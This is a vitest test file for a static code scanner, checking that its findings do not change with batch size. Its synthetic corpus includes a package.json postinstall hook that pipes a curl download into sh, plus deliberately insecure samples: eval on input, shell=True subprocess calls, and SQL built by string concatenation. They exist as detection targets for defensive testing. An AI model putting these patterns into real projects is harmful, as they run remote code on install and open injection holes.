// Batch-size invariance: scanIssuesAsync resolves and scans content in
// batches, and its results must not depend on the batch size. This covers the
// state the orchestrator carries across batches: per-rule caps and overflow,
// deferred AST eval capping, lockfile context for a manifest read in an
// earlier batch, partial engine coverage, suppression counts, and content that
// is missing from the store.

import { describe, expect, it, vi } from 'vitest'

vi.mock('@/lib/parsers/tree-sitter', () => import('@/lib/code/scanner/__tests__/tree-sitter-mock'))

import {
  batchIndexMetadataOnly,
  createEmptyIndex,
  createEmptyIndexWithStore,
  indexFile,
  InMemoryContentStore,
  type CodeIndex,
} from '@/lib/code/code-index'
import type { FullAnalysis } from '@/lib/code/import-parser'
import { analyzeCodebase } from '@/lib/code/parser/analyzer'
import { clearScanCache, scanIssuesAsync, type ScanOptions } from '@/lib/code/scanner/scanner'
import type { ScanResults } from '@/lib/code/scanner/types'
import type { FixtureCase } from './accuracy-sweep/types'
import { cFixtures } from './accuracy-sweep/fixtures-c'
import { compositeFixtures } from './accuracy-sweep/fixtures-composite'
import { csharpFixtures } from './accuracy-sweep/fixtures-csharp'
import { goFixtures } from './accuracy-sweep/fixtures-go'
import { javaFixtures } from './accuracy-sweep/fixtures-java'
import { jstsFixtures } from './accuracy-sweep/fixtures-jsts'
import { kotlinFixtures } from './accuracy-sweep/fixtures-kotlin'
import { phpFixtures } from './accuracy-sweep/fixtures-php'
import { pythonFixtures } from './accuracy-sweep/fixtures-python'
import { rubyFixtures } from './accuracy-sweep/fixtures-ruby'
import { rustFixtures } from './accuracy-sweep/fixtures-rust'
import { shellFixtures } from './accuracy-sweep/fixtures-shell'

const ALL_FIXTURES: FixtureCase[] = [
  ...jstsFixtures,
  ...pythonFixtures,
  ...goFixtures,
  ...rustFixtures,
  ...javaFixtures,
  ...compositeFixtures,
  ...phpFixtures,
  ...cFixtures,
  ...rubyFixtures,
  ...shellFixtures,
  ...csharpFixtures,
  ...kotlinFixtures,
]

/** 50 is the production batch size; 100 is the largest content resolution allows. */
const BATCH_SIZES = [1, 50, 100] as const

type FileSpec = readonly [path: string, content: string, language: string]

/** Every result field except the scan timestamp. */
function comparable(result: ScanResults) {
  return {
    ...result,
    scannedAt: undefined,
    ruleOverflow: [...result.ruleOverflow].sort(([a], [b]) => a.localeCompare(b)),
  }
}

/** Scan once per batch size and assert every result equals the production (50) one. */
async function expectBatchSizeInvariant(
  buildIndex: () => CodeIndex,
  analysis: FullAnalysis | null = null,
  options: ScanOptions = {},
): Promise<ScanResults> {
  const results = new Map<number, ScanResults>()
  for (const batchSize of BATCH_SIZES) {
    clearScanCache()
    results.set(batchSize, await scanIssuesAsync(buildIndex(), analysis, { ...options, batchSize }))
  }
  clearScanCache()
  const production = results.get(50)!
  for (const batchSize of BATCH_SIZES) {
    expect.soft(comparable(results.get(batchSize)!), `batch size ${batchSize}`).toEqual(comparable(production))
  }
  return production
}

function buildIndex(files: ReadonlyArray<FileSpec>): CodeIndex {
  let index = createEmptyIndex()
  for (const [path, content, language] of files) index = indexFile(index, path, content, language)
  return index
}

/** Every accuracy fixture in one index, each under its own directory. */
function fixtureFiles(): FileSpec[] {
  return ALL_FIXTURES.map((fixture, i) => [
    `case-${String(i).padStart(3, '0')}/${fixture.file.path}`,
    fixture.file.content,
    fixture.file.language,
  ] as const)
}

/**
 * About 110 files, so production reads three 50-file content batches:
 * package.json comes first and its lockfile last, more than 15 non-security
 * hits and more than 15 eval hits of one rule span batches, one file cannot be
 * parsed, one excluded test file sits among scanned files, and the import
 * graph has a cycle and a hub with many importers.
 */
function corpusFiles(): FileSpec[] {
  const files: FileSpec[] = [
    ['package.json', JSON.stringify({
      name: 'corpus',
      scripts: { postinstall: 'curl https://example.com/install.sh | sh' },
      dependencies: { lodash: '*', helper: 'git+https://github.com/example/helper.git' },
    }, null, 2), 'json'],
    ['src/shared.ts', 'export const shared: any = 1\nexport function helper(value: string) { return value }', 'typescript'],
  ]
  for (let i = 0; i < 60; i++) {
    files.push([
      `src/log-${i}.ts`,
      `import { helper } from './shared'\nexport function log${i}(value: string) {\n  console.log(helper(value))\n}`,
      'typescript',
    ])
  }
  for (let i = 0; i < 20; i++) {
    files.push([
      `src/ast-eval-${i}.ts`,
      `import { helper } from './shared'\nexport const run${i} = Function(helper("return ${i}"))`,
      'typescript',
    ])
  }
  for (let i = 0; i < 20; i++) {
    files.push([
      `src/regex-eval-${i}.ts`,
      `export function evaluate${i}(input: string) {\n  return eval(input)\n}`,
      'typescript',
    ])
  }
  files.push(
    ['src/cycle-a.ts', "import { b } from './cycle-b'\nexport const a = (): number => b()", 'typescript'],
    ['src/cycle-b.ts', "import { a } from './cycle-a'\nexport const b = (): number => a()", 'typescript'],
    ['src/conflicted.ts', '<<<<<<< HEAD\nconst value = 1\n=======\nconst value = 2\n>>>>>>> feature', 'typescript'],
    ['src/large.ts', Array.from({ length: 450 }, (_, i) => `export const value${i} = ${i}`).join('\n'), 'typescript'],
    ['server/app.py', 'import subprocess\n\ndef run(cmd):\n    try:\n        subprocess.call(cmd, shell=True)\n    except:\n        pass\n', 'python'],
    ['server/main.go', 'package main\n\nimport (\n\t"database/sql"\n\t"net/http"\n)\n\nfunc handler(db *sql.DB, r *http.Request) {\n\tdb.Query("SELECT * FROM users WHERE id = " + r.URL.Query().Get("id"))\n}\n', 'go'],
    ['.github/workflows/ci.yml', 'on: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n', 'yaml'],
    ['requirements.txt', 'requests\nflask>=2.0\n', 'text'],
    ['src/__tests__/excluded.test.ts', 'eval(userInput)', 'typescript'],
    ['package-lock.json', JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { name: 'corpus' },
        'node_modules/lodash': { version: '4.17.21', resolved: 'http://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz' },
      },
    }, null, 2), 'json'],
  )
  return files
}

describe('scanIssuesAsync batch-size invariance', () => {
  it('returns the same results for every accuracy fixture in one index', { timeout: 180_000 }, async () => {
    expect(ALL_FIXTURES.length).toBeGreaterThanOrEqual(220)
    const files = fixtureFiles()
    const result = await expectBatchSizeInvariant(() => buildIndex(files))

    // More than 200 scanned files means at least five production batches.
    expect(result.scannedFiles).toBeGreaterThan(200)
  })

  it('returns the same results for a multi-file corpus', { timeout: 60_000 }, async () => {
    const files = corpusFiles()
    const result = await expectBatchSizeInvariant(() => buildIndex(files))

    // The corpus exercises what it claims to.
    expect(files.length).toBeGreaterThan(100)
    expect(result.ruleOverflow.get('console-log')).toBeGreaterThan(0)
    expect(result.issues.filter(issue => issue.ruleId === 'eval-usage').length).toBeGreaterThan(15)
    expect(result.issues.some(issue => issue.ruleId === 'supply-chain-no-lockfile')).toBe(false)
    expect(result.issues.some(issue => issue.ruleId === 'supply-chain-http-registry')).toBe(true)
    expect(result.issues.some(issue => issue.file.includes('__tests__'))).toBe(false)
    expect(result.diagnostics.engines.ast).toBe('partial')
  })

  it('returns the same results for the corpus with a FullAnalysis', { timeout: 60_000 }, async () => {
    const files = corpusFiles()
    const analysis = await analyzeCodebase(buildIndex(files))
    const result = await expectBatchSizeInvariant(() => buildIndex(files), analysis)

    expect(result.issues.some(issue => issue.description.includes('high fan-in'))).toBe(true)
  })

  it.each([
    ['one source file', ['src/log-3.ts']],
    ['the manifest and its lockfile', ['package.json', 'package-lock.json']],
    ['a file and an excluded file', ['src/regex-eval-1.ts', 'src/__tests__/excluded.test.ts']],
  ])('returns the same results for a partial scan of %s', async (_label, changedFiles) => {
    const files = corpusFiles()
    const result = await expectBatchSizeInvariant(() => buildIndex(files), null, { changedFiles })

    expect(result.isPartialScan).toBe(true)
  })

  it('returns the same results when store content is missing for some files', async () => {
    const files = corpusFiles()
    const missing = new Set(['src/log-10.ts', 'src/regex-eval-5.ts', 'package-lock.json'])
    const getBatchCalls = new Map<number, number>()
    let currentBatchSize = 0
    const buildStoreIndex = () => {
      const store = new InMemoryContentStore(new Map(
        files.filter(([path]) => !missing.has(path)).map(([path, content]) => [path, content]),
      ))
      const getBatch = store.getBatch.bind(store)
      store.getBatch = async paths => {
        getBatchCalls.set(currentBatchSize, (getBatchCalls.get(currentBatchSize) ?? 0) + 1)
        return getBatch(paths)
      }
      return batchIndexMetadataOnly(
        createEmptyIndexWithStore(store),
        files.map(([path, content, language]) => ({ path, language, lineCount: content.split('\n').length })),
      )
    }
    const results = new Map<number, ScanResults>()
    for (const batchSize of BATCH_SIZES) {
      currentBatchSize = batchSize
      clearScanCache()
      results.set(batchSize, await scanIssuesAsync(buildStoreIndex(), null, { batchSize }))
    }
    clearScanCache()

    for (const batchSize of BATCH_SIZES) {
      expect.soft(comparable(results.get(batchSize)!), `batch size ${batchSize}`).toEqual(comparable(results.get(50)!))
    }
    const scannable = files.filter(([path]) => !path.includes('__tests__')).length
    expect(getBatchCalls.get(1)).toBe(scannable)
    expect(getBatchCalls.get(50)).toBe(Math.ceil(scannable / 50))
    expect(getBatchCalls.get(100)).toBe(Math.ceil(scannable / 100))
    expect(results.get(50)).toMatchObject({ isPartialScan: true, unscannedFileCount: missing.size })
  })
})
